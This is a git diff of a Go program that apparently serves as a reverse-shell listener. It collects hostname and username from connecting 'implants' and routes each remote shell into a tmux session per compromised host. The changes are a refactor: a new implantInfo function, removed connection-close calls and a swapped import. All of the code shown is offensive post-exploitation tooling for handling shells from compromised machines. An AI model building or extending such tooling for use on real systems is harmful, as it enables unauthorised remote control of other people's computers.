@@ -4,7 +4,6 @@ import (
 	"bufio"
 	"crypto/tls"
 	"fmt"
-	"go-tty"
 	"io"
 	"io/ioutil"
 	"net"
@@ -15,6 +14,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"tty"
 
 	"github.com/jessevdk/go-flags"
 	log "github.com/sirupsen/logrus"
@@ -45,6 +45,7 @@ func init() {
 	// it needs to be piped to bash in order to work.
 	// Because of this, all logging is sent to stderr
 	log.SetOutput(os.Stderr)
+	// log.SetLevel(log.DebugLevel)
 }
 
 func main() {
@@ -69,7 +70,6 @@ func main() {
 				log.Error(err)
 				continue
 			}
-			defer conn.Close()
 
 			sockF, err := routeToTmux(conn)
 			if err != nil {
@@ -100,7 +100,6 @@ func main() {
 				log.Error(err)
 				continue
 			}
-			defer conn.Close()
 			go startShell(conn)
 		}
 	}
@@ -169,24 +168,32 @@ func startShell(conn net.Conn) {
 	}
 }
 
-func routeToTmux(conn net.Conn) (string, error) {
-
+func implantInfo(conn net.Conn) (hostname, username string, err error) {
 	reader := bufio.NewReader(conn)
-	hostname, err := reader.ReadString('\n')
+	hostname, err = reader.ReadString('\n')
 	if err != nil {
 		err = fmt.Errorf("hostname read failed: %w", err)
-		return "", err
+		return
 	}
 
-	username, err := reader.ReadString('\n')
+	username, err = reader.ReadString('\n')
 	if err != nil {
 		err = fmt.Errorf("username read failed: %w", err)
-		return "", err
+		return
 	}
 
 	// tmux session names can't contain "."
 	hostname = strings.ReplaceAll(strings.TrimSuffix(hostname, "\n"), ".", "_")
 	username = strings.TrimSuffix(username, "\n")
+	return
+}
+
+func routeToTmux(conn net.Conn) (string, error) {
+
+	hostname, username, err := implantInfo(conn)
+	if err != nil {
+		return "", fmt.Errorf("failed getting implant info: %w", err)
+	}
 
 	if sessions[hostname] == nil {
 		log.WithField("host", hostname).Info("new host connected, creating session")
@@ -194,15 +201,13 @@ func routeToTmux(conn net.Conn) (string, error) {
 	}
 
 	session := sessions[hostname]
-
-	windowName := username
-	window := session.AddWindow(windowName)
+	window := session.AddWindow(username)
 
 	if _, err := os.Stat(".state"); os.IsNotExist(err) {
 		os.Mkdir(".state", 0700)
 	}
 
-	file, err := ioutil.TempFile(".state", fmt.Sprintf("%s.*.sock", windowName))
+	file, err := ioutil.TempFile(".state", fmt.Sprintf("%s.*.sock", username))
 	if err != nil {
 		err = fmt.Errorf("temp file failed: %w", err)
 		return "", err
@@ -217,7 +222,7 @@ func routeToTmux(conn net.Conn) (string, error) {
 
 	self := os.Args[0]
 	cmd := fmt.Sprintf("%s -s %s", self, path)
-	log.WithFields(log.Fields{"session": session.Name, "window": windowName}).Info("new shell in tmux")
+	log.WithFields(log.Fields{"session": session.Name, "window": username}).Info("new shell in tmux")
 	window.Exec(`echo -e '\a'`) // ring a bell
 	window.Exec(cmd)
 	return path, nil
@@ -237,7 +242,6 @@ func proxyConnToSocket(conn net.Conn, sockF string) {
 	// forward socket to tcp
 	wg.Add(1)
 	go (func(socket net.Conn, conn net.Conn) {
-		defer conn.Close()
 		defer wg.Done()
 		io.Copy(conn, socket)
 	})(socket, conn)
